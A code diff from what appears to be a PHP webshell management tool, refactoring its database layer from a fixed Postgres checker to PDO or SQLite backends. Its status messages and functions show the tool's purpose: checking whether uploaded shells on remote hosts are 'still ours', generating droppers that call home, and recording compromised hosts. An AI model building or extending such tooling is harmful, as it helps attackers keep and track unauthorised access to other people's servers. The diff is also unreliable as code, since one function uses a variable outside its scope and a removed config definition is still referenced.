@@ -9,37 +9,38 @@ if (strtolower(php_uname()) == "windows") {
     define('clears', "clear");
 }
 
-require "includes/db/postgres_checker.php";
+include "defaults.php";
 require "includes/droppers/dynamic_generator.php";
-$firstRun = new postgres_checker();
+
+
+if (defined("SQL_SELECTION")){
+    switch (SQL_SELECTION){
+        case strpos(SQL_SELECTION, "pgsql") !== false:
+            require "includes/db/postgres_pdo.php";
+            $db_call = new postgres_checker("pgsql:host=localhost;dbname=postgres", "postgres", "", array(
+                PDO::ATTR_PERSISTENT => true
+            )); //Change these values as needed.
+            if (empty(config['sloppy_db']['pass'])) {
+                $db_call->createDB();
+            }
+            break;
+        case strpos(SQL_SELECTION, "sqlite3") !== false:
+        default:
+            require "includes/db/slopSqlite.php";
+            $db_call = new slopSqlite("includes/db/sqlite3_repo/slopSqlite.sqlite3", SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE, "");
+            break;
+    }
+}
 const response_array = array(
     "default" => PHP_EOL . "\e[1;33m%s%s Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\e[0m" . PHP_EOL,
     "200" => PHP_EOL . "\e[0;32m%s%s is still ours!\e[0m" . PHP_EOL,
     "404" => PHP_EOL . "\e[0;31m%s%s Looks like our shell was caught... sorry..\e[0m" . PHP_EOL,
     "500" => PHP_EOL . "\e[1;31m%s%s Your useragent was not the correct one... did you forget??\e[0m" . PHP_EOL
 );
-define("config", parse_ini_file('includes/config/sloppy_config.ini', true, 2));
-if (empty(config['sloppy_db']['pass'])) {
-    $firstRun->createDB();
-    define('DBCONN', sprintf("host=%s port=%s user=%s password=%s dbname=%s",
-        config['sloppy_db']['host'],
-        config['sloppy_db']['port'],
-        config['sloppy_db']['user'],
-        config['sloppy_db']['pass'],
-        config['sloppy_db']['dbname']
-    ));
-} else {
-    define('DBCONN', sprintf("host=%s port=%s user=%s password=%s dbname=%s",
-        config['sloppy_db']['host'],
-        config['sloppy_db']['port'],
-        config['sloppy_db']['user'],
-        config['sloppy_db']['pass'],
-        config['sloppy_db']['dbname']
-    ));
-}
+
 
 if (config['sloppy_proxies']['proxy_init'] !== true){
-    $firstRun->getProxies('initial');
+    $db_call->getProxies('initial');
 }else{
     echo "proxies built".PHP_EOL;
 }
@@ -616,10 +617,9 @@ function createDropper($callHome)
 
 function aHo($host, $os, $checkIn)
 {
-    $t = new postgres_checker();
     if (!empty($host)) {
         $path = parse_url($host);
-        if ($t->insertRecord($path['scheme'] . "://" . $path['host'] . ":" . $path['port'], $path['path'], $os, $checkIn, $uuid = '', $action = 'add') != 0) {
+        if ($db_call->insertRecord($path['scheme'] . "://" . $path['host'] . ":" . $path['port'], $path['path'], $os, $checkIn, $uuid = '', $action = 'add') != 0) {
             if (strpos($path['path'], 'txt'))
             {
                 logo('co',clears,true, 'Extension cannot end in anything other than php, as this is a php webshell.', sprintf('%s', $path['host'].$path['port'].":".$path['path']));
